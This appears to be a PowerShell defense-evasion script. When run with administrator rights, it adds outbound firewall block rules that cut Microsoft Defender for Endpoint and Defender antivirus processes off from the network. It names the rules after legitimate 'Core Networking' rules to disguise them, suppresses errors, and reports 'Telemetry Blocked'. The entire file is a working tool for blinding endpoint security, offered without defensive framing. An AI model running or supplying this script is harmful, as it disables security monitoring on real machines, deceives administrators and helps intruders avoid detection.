function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (IsAdmin) {
    $rules = @(
        @{ Name = "Core Networking - DNS (UDP-Out)"; Path = "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe" },
        @{ Name = "Core Networking - DNS (TCP-Out)"; Path = "C:\Program Files\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" },
        @{ Name = "Core Networking - DHCP (UDP-Out)"; Path = "C:\Program Files\Windows Defender Advanced Threat Protection\SenseIR.exe" },
        @{ Name = "Core Networking - Group Policy (TCP-Out)"; Path = "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MsMpEng.exe" },
        @{ Name = "Core Networking - Group Policy (UDP-Out)"; Path = "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpDlpService.exe" }
    )

    $success = $false
    foreach ($rule in $rules) {
        try {
            New-NetFirewallRule -DisplayName $rule.Name -Direction Outbound -Program $rule.Path -Action Block -ErrorAction SilentlyContinue | Out-Null
            $success = $true
        } catch {}
    }

    if ($success) {
        Write-Host "Defender Silence :                                            [OK] Telemetry Blocked" -ForegroundColor Green
    } else {
        Write-Host "Defender Silence :                                            [??] Partial or Failed" -ForegroundColor DarkYellow
    }
} else {
    Write-Host "Defender Silence :                                            [??] Missing Privileges" -ForegroundColor DarkYellow
}
